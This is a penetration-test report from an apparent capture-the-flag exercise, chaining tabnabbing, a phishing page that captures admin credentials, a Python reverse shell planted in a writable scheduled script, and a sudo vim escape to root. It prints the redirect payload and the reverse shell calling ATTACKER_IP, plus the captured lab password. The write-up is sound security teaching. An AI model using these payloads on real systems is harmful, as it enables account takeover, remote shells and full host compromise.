# This assessment was conducted in a controlled CTF environment

# Web Application Penetration Test Report  
Attack Chain: Tabnabbing - Credential Harvesting - Root Compromise

## 1. Executive Summary

During this assessment, a complete system compromise was achieved chaining multiple
vulnerabilities.

The initiation was done by abusing a client-side (Tabnabbing vulnerability)
in a URL review feature used by an authenticated administrator. Which led to credential
harvesting, SSH access, and post-exploitation. Weak permission controls and
dangerous sudo configuration allowed privilege escalation to root.

Overall Risk - Critical  
Attack Complexity - Low  
User Interaction Required - Yes (Administrator)  
Final Privilege Level - Root

## 2. Scope & Environment

#### In Scope
- Web application URL submission and review functionality
- Administrator browser context
- Local services accessible post-authentication
- Privilege escalation vectors on the target system

#### Out of Scope
- Denial of Service
- Attacks outside the target host

## 3. Methodology

The following methodology was used

1. Application behavior analysis
2. Client-side attack surface identification
3. Exploitation and credential harvesting
4. Post-exploitation enumeration
5. Privilege escalation
6. Impact analysis and documentation

Evidence is provided via commands, payloads, and observable behavior.

## 4. Findings Summary

| ID | Finding | Severity |
|----|--------|----------|
| F1 | Tabnabbing via `window.opener` | High |
| F2 | Credential Harvesting (Phishing) | Critical |
| F3 | Writable Scheduled Task Script | High |
| F4 | Sudo Misconfiguration (VIM) | Critical |


## 5. Detailed Findings

### F1 - Tabnabbing via `window.opener`

#### Description

The application allows users to submit URLs that are manually reviewed by an administrator.
Submitted URLs are opened directly in an authenticated browser session.

No protection was implemented to prevent the reviewed page from interacting with
the original application tab via `window.opener`.

This allowed me to silently replace the legitimate application tab with
controlled content.

#### Proof of Concept

A malicious page was hosted and submitted for a review

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      window.opener.location = "http://ATTACKER_IP:8000/hack.html";
    </script>
  </body>
</html>
```

When opened by the administrator, the original tab was replaced without visible warning.

#### Impact 
- UI deception
- Session context abuse
- Credential harvesting preparation

## F2 - Credential Harvesting via Phishing

#### Description
- The redirected page copies the legitimate administrator login page.
- The administrator entered valid credentials into the fake form.
- The credentials were transmitted in plaintext.

#### Evidence
Captured credentials:
- Username: daniel
- Password: C@ughtm3napping123

These credentials were successfully used to authenticate via SSH.

#### Impact
- Full compromise of administrator account
- Authentication bypass
- Lateral movement enabled


## 6. Post-Exploitation

### F3 - Writable Scheduled Task (Python Script Abuse)

#### Description
After obtaining SSH access, local enumeration revealed a scheduled service executing
a Python script (query.py) every minute. The script was writable by a non-privileged user.

Supporting file service_info.txt described the task as an automated update service.

#### Exploitation
query.py was made into a reverse shell
```py
import socket
from os import dup2
from subprocess import run

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 8888))
dup2(s.fileno(), 0) # stdin
dup2(s.fileno(), 1) # stdout
dup2(s.fileno(), 2) # stderr
run(["/bin/bash", "-i"])
```

After timed execution, the shell was connected.

#### Impact
- Remote code execution
- Privilege escalation path

## F4 - Sudo Misconfiguration (VIM as Root)

#### Description
- The user adrian was allowed to execute vim as root without password authentication.

Evidence
``` bash
sudo -l
Output:

(ALL) NOPASSWD: /usr/bin/vim
```

#### Exploitation
``` bash
sudo vim
Inside VIM:

:!/bin/bash
```
This spawned root shell

#### Impact
- root escalation
- full system control

## 7. Impact Summary
- Administrator credentials compromised
- RCE achieved
- Privilege escalation
- Full system compromise

## 8. Lessons Learned
This assessment demonstrates how a low-complexity client-side vulnerability
can escalate into a full system takeover when combined with weak operational security.

#### Key failures:
- Unsafe URL review process
- Lack of phishing protection
- Poor permission management
- Dangerous sudo configuration

## 9. Conclusion
A complete compromise was achieved through a chained attack beginning with a client-side
vulnerability and ending with root access.

Each issue was individually preventable; together they formed a critical attack path.
This highlights the importance of defense in depth and least privilege enforcement.
